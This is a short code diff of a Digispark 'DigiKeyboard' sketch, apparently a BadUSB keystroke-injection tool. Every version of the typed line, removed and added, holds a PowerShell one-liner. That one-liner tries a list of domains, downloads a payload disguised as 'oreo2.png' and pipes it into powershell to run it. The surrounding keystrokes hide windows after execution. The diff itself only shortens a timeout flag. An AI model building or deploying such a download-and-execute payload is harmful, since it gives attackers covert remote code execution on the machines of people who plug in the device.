@@ -41,7 +41,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_I);
   DigiKeyboard.delay(3000);
 
-  DigiKeyboard.print(F("foreach($_ in @("DOMAINS")){wget -v -TimeoutSec 6 https://$_"LINK" -O ~/oreo2.png;if($?){cat ~/oreo2.png | powershell;break}};exit\n"));
+  DigiKeyboard.print(F("foreach($_ in @("DOMAINS")){wget -v -Ti 6 https://$_"LINK" -O ~/oreo2.png;if($?){cat ~/oreo2.png | powershell;break}};exit\n"));
 
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT);
